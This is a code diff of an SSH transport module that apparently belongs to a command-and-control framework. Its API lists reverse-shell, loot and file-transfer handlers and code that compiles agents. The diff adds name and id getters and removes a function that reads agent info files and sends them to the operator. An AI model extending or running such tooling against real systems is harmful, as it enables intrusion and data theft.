@@ -2,6 +2,9 @@
 
 int type = 99; // type TRANSPORT
 
+char *name = "SSH Transport";
+int id = 55;
+
 int port = 22;
 ssh_bind sshbind;
 ssh_session session;
@@ -10,9 +13,9 @@ pClientDat data;
 
 transport_t transport_api = {
     send_ok, send_err, listen, read, write,
-    download_file, get_loot, upload_file, get_info,
+    download_file, get_loot, upload_file, 
     init_reverse_shell, determine_handler, init, end, nullptr, 
-    get_data
+    get_data, get_name, get_id
 };
 
 int init(pClientDat dat)
@@ -24,6 +27,14 @@ int end()
 {
     ssh_bind_free(sshbind);
     ssh_finalize();
+}
+
+char *get_name(){
+    return name;
+}
+
+int get_id(){
+    return id;
 }
 
 int determine_handler(){
@@ -453,83 +464,6 @@ int get_loot(char *loot){
     return 0;
 }
 
-
-/*Returns information on all of the agents the server manages*/
-int get_info(char *ptr){
-    int size = 0;
-    int rc = 0;
-    char buff[BUFSIZ];
-    char name[BUFSIZ];
-    char logbuff[BUFSIZ];
-    char *dat = NULL;
-    char tmpbf[3];
-    DIR *dir;
-    FILE *file;
-    struct dirent *ent;
-
-    memset(buff, 0, sizeof(buff));
-    memset(name, 0, sizeof(name));
-    memset(logbuff, 0, sizeof(logbuff));
-    if ((dir = opendir ("agents/")) != NULL) {
-        /* print all the files and directories within directory */
-        while ((ent = readdir (dir)) != NULL) {
-            if(!strcmp(ent->d_name, ".") || !strcmp(ent->d_name, "..") || !strcmp(ent->d_name, "agents.dat")){
-                continue;
-            } else {
-                memset(buff, 0, sizeof(buff));
-                memset(name, 0, sizeof(name));
-                sprintf(buff, "/agents/%s/info.txt", ent->d_name);
-                getcwd(name, sizeof(name));
-                strcat(name, buff);
-                file = fopen(name, "r");
-                memset(buff, 0, sizeof(buff));
-                if(file == NULL){
-                    printf("Manager %s: Could not get info on agent %s\n", data->id, ent->d_name);
-                    perror("");
-                } else {
-                    // get file size
-                    fseek(file, 0L, SEEK_END);
-                    size = ftell(file);
-                    printf("Size: %d\n", size);
-
-                    // Allocate file memory 
-                    dat = (char *)malloc(size);
-                    memset(dat, 0, size);
-                    rewind(file);
-                    fread(dat, 1, size, file);
-                    
-                    rc = ssh_channel_write(channel, dat, strlen(dat));
-                    free(dat);
-                    if(rc == SSH_ERROR){
-                        printf("Manager %s: Caught channel error: %s\n", data->id, ssh_get_error(session));
-                        return 1;
-                    }
-                    
-                    rc = ssh_channel_read(channel, tmpbf, 3, 0);
-                    if(rc == SSH_ERROR){
-                        printf("Manager %s: Caught channel error: %s\n", data->id, ssh_get_error(session));
-                        return 1;
-                    }
-                }
-            }
-        }
-        rc = ssh_channel_write(channel, "fi", 2);
-        if(rc == SSH_ERROR){
-            printf("Manager %s: Caught channel error: %s\n", data->id, ssh_get_error(session));
-            return 1;
-        }
-        closedir (dir);
-    } else {
-        /* could not open directory */
-        printf("Manager %s: Failed to open directory\n", data->id);
-            
-        perror ("");
-        return 2;
-    }
-    return 0;
-
-}
-
 void make_agent(char *dat_ptr, char *d_ptr){
     AgentInformationHandler::compile(dat_ptr, d_ptr);
 }
@@ -725,6 +659,7 @@ int read(char **buff, int length){
 }
 
 int write(char *buff, int length){
+    printf("writing %s to channel...\n", buff);
     int rc = 0;
     rc = ssh_channel_write(channel, buff, length);
     if(rc == SSH_ERROR){
